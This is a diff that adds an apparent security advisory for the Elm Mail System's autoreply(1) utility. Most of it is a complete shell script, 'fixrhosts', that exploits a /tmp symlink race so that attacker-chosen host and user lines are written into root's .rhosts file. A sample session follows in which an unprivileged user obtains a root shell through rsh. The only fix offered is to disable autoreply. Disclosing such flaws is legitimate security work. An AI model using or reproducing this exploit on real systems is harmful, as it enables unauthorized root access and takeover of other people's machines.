@@ -1,0 +1,69 @@
+COMMAND
+
+    autoreply(1)
+
+SYSTEMS AFFECTED
+
+    Any system with  a standard installation  of The Elm  Mail System.
+    All versions are belived to have this vulnerability.
+
+PROBLEM
+
+    autoreply(1) can  be used  to create  root owned  files, with mode
+    666.  It  can  also  overwrite  any file with semi user-controlled
+    data.
+
+    This  example  demonstrates  how  to  become root on most affected
+    machines  by  modifying  root's  .rhosts  file.   Please do not do
+    this unless you have permission.
+
+    Create the following script, 'fixrhosts':
+
+    --------------------------- cut here ----------------------------
+    #!/bin/sh
+    #
+    # fixrhosts rhosts-file user machine
+    #
+    if [ $# -ne 3 ]; then
+            echo "Usage: `basename $0` rhosts-file user machine"
+            exit 1
+    fi
+    RHOSTS="$1"
+    USERNAME="$2"
+    MACHINE="$3"
+    cd $HOME
+    echo x > "a
+    $MACHINE $USERNAME
+    b"
+    umask 022
+    autoreply "a
+    $MACHINE $USERNAME
+    b"
+    cat > /tmp/.rhosts.sh.$$ << 'EOF'
+    ln -s $1 `echo $$ | awk '{printf "/tmp/arep.%06d", $1}'`
+    exec autoreply off
+    exit 0
+    EOF
+    /bin/sh /tmp/.rhosts.sh.$$ $RHOSTS
+    rm -f /tmp/.rhosts.sh.$$ "a
+    $MACHINE $USERNAME
+    b"
+    exit 0
+    --------------------------- cut here ----------------------------
+
+    (Lines marked with > represent user input)
+
+>   % id
+    uid=97(8lgm) gid=97(8lgm) groups=97(8lgm)
+>   % ./fixrhosts ~root/.rhosts 8lgm localhost
+    You've been added to the autoreply system.
+    You've been removed from the autoreply table.
+>   % rsh localhost -l root csh -i
+    Warning: no access to tty.
+    Thus no job control in this shell.
+    #
+
+SOLUTION
+
+    Disable autoreply. Wait for a patch from the Elm maintainers.
+
